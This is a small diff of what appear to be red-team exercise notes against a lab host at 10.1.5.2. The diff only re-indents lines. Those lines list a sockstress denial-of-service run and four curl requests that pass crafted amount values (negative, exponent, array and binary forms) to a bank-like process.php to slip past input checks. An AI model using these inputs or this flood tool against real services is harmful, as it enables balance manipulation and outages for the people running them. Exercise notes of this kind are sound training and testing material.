@@ -55,10 +55,10 @@ Red:
         run sockstress.sh with parameters 10.1.5.2:80 ethx -p payloads/http
 
     6. Interesting
-    curl "http://10.1.5.2/process.php?user=aaa&pass=aaa&amount=-1&#45100&drop=balance" -> bypasses the drop=balance going to the default option.
-    curl "http://10.1.5.2/process.php?user=random&pass=aaaa&amount=0.23e5&drop=deposit" -> reads number elevated to the power after e.
-    curl "http://10.1.5.2/process.php?user=random&pass=random&amount[]=-5&amount[]=200&drop=deposit" => amount evaluated as 1
-    curl "http://10.1.5.2/process.php?user=random&pass=random&amount=-0b11&drop=deposit" => with intval is evaluated to 0 but try it anyway
+        curl "http://10.1.5.2/process.php?user=aaa&pass=aaa&amount=-1&#45100&drop=balance" -> bypasses the drop=balance going to the default option.
+        curl "http://10.1.5.2/process.php?user=random&pass=aaaa&amount=0.23e5&drop=deposit" -> reads number elevated to the power after e.
+        curl "http://10.1.5.2/process.php?user=random&pass=random&amount[]=-5&amount[]=200&drop=deposit" => amount evaluated as 1
+        curl "http://10.1.5.2/process.php?user=random&pass=random&amount=-0b11&drop=deposit" => with intval is evaluated to 0 but try it anyway
         
 References for vulnerabilities:
     https://www.cybersecurity-help.cz/vdb/SB2020102113
